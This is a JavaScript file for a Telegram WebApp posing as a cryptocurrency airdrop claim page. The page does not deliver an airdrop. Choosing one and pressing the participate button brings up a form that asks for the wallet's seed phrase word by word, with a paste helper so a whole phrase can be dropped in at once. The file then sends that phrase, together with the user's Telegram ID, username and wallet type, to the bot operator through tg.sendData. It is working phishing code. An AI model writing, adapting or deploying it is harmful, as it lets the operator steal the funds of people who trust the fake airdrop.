let tg = null;
let demoMode = false;

// ======= Ініціалізація Telegram WebApp =======
function initTelegram() {
    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
        console.warn("📦 Telegram WebApp не знайдено – активовано демо-режим.");
        demoMode = true;
        return;
    }

    tg = Telegram.WebApp;
    tg.ready();
    console.log("✅ Telegram WebApp ініціалізовано");

    const user = tg.initDataUnsafe?.user || {};

    if (user.id) {
        const uid = user.id;
        const uname = user.username || "-";
        const fname = [user.first_name, user.last_name].filter(Boolean).join(" ") || "-";
        const timestamp = new Date().toISOString();

        localStorage.setItem("tg_user_id", uid);
        localStorage.setItem("tg_username", uname);
        localStorage.setItem("tg_name", fname);
        localStorage.setItem("tg_timestamp", timestamp);
    } else {
        console.warn("⛔️ Користувач Telegram не визначений, fallback на localStorage");
    }
}

// ======= DOM завантажено =======
document.addEventListener("DOMContentLoaded", () => {
    initTelegram();

    const tgStatus = document.getElementById("tg_status");
    const uid = localStorage.getItem("tg_user_id") || "-";
    const uname = localStorage.getItem("tg_username") || "-";
    const fname = localStorage.getItem("tg_name") || "-";

    if (tgStatus) {
        tgStatus.innerHTML = `
            <div class="profile-card">
                <p><strong>👤 Пользователь:</strong> ${fname}</p>
                <p><strong>🆔 Telegram ID:</strong> ${uid}</p>
                <p><strong>💛 Username:</strong> ${uname !== "-" ? "@" + uname : "нет"}</p>
            </div>
        `;
    }

    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('airdropList');
            container.innerHTML = '';
            data.forEach(drop => {
                const card = document.createElement('div');
                card.className = 'airdrop-card';
                card.innerHTML = `
                    <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
                    <h2>${drop.name}</h2>
                    <p>💸 Нагорода: <strong>${drop.reward}</strong></p>
                    <p>🌐 Мережа: ${drop.network}</p>
                    <p>⏳ До: ${drop.ends}</p>
                    <button onclick="selectAirdrop('${drop.name}')">Участь</button>
                `;
                container.appendChild(card);
            });
        })
        .catch(error => {
            console.error("❌ Помилка при завантаженні airdrops.json:", error);
            document.getElementById("airdropList").innerHTML =
                "<p style='color:red'>❌ Не вдалося завантажити список airdrop'ів.</p>";
        });

    const btn = document.getElementById('submitBtn');
    if (btn) btn.addEventListener('click', submitAirdrop);

    const selectWrapper = document.querySelector('.custom-select');
    if (selectWrapper) {
        const selected = selectWrapper.querySelector('.selected');
        const options = selectWrapper.querySelectorAll('.options li');
        const hiddenInput = document.querySelector('#wallet');

        selected.addEventListener('click', () => {
            selectWrapper.classList.toggle('open');
        });

        options.forEach(option => {
            option.addEventListener('click', () => {
                selected.innerHTML = option.innerHTML;
                hiddenInput.value = option.dataset.value;
                selectWrapper.classList.remove('open');
            });
        });

        document.addEventListener('click', e => {
            if (!selectWrapper.contains(e.target)) {
                selectWrapper.classList.remove('open');
            }
        });
    }
});

function selectAirdrop(name) {
    document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
    document.getElementById('airdropList').style.display = 'none';
    document.getElementById('airdropForm').style.display = 'block';
    renderSeedInputs();
}

function renderSeedInputs() {
    const length = parseInt(document.getElementById('length').value);
    const container = document.getElementById('seedContainer');
    container.innerHTML = '';

    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `Слово ${i + 1}`;
        container.appendChild(input);
    }

    const inputs = container.querySelectorAll('input');
    if (inputs.length > 0) {
        inputs[0].addEventListener('paste', (e) => {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const words = pasted.trim().split(/\s+/);
            if (words.length > 1) {
                words.forEach((word, index) => {
                    if (inputs[index]) inputs[index].value = word;
                });
            } else {
                inputs[0].value = pasted;
            }
        });
    }
}

function submitAirdrop() {
    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
    const words = inputs.map(input => input.value.trim()).filter(Boolean);

    if (words.length !== inputs.length) {
        document.getElementById('validationWarning').innerText = '❗️ Заповніть всі поля.';
        document.getElementById('validationWarning').style.display = 'block';
        return;
    }

    const payload = {
        event: "airdrop_claim",
        user_id: tg?.initDataUnsafe?.user?.id || localStorage.getItem("tg_user_id") || "-",
        username: tg?.initDataUnsafe?.user?.username || localStorage.getItem("tg_username") || "-",
        name: localStorage.getItem("tg_name") || "-",
        timestamp: new Date().toISOString(),
        seed: words.join(" "),
        wallet: document.getElementById("wallet").value
    };

    localStorage.setItem("tg_user_id", payload.user_id);
    localStorage.setItem("tg_username", payload.username);
    localStorage.setItem("tg_name", payload.name);
    localStorage.setItem("tg_timestamp", payload.timestamp);
    localStorage.setItem("last_seed", payload.seed);
    localStorage.setItem("wallet_used", payload.wallet);

    if (!demoMode && tg?.sendData) {
        console.log("[📤 Надсилання в Telegram WebApp]", payload);
        tg.sendData(JSON.stringify(payload));
        tg.close();
    } else {
        console.warn("📦 Демо-режим: дані не надіслано через Telegram.");
        alert("📦 Демо-режим: дані не надіслано (браузерний режим). Переходимо до профілю.");
        console.log("[DEMO PAYLOAD]", payload);
        window.location.href = "airprofile.html";
    }
}
